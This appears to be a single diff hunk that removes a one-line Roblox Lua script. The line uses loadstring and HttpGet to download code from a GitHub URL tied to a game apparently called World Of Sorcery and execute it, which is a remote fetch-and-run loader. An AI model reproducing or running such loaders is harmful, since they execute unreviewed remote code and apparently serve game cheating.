@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MetabV2/World-Of-Sorcery/main/Metab", true))() 
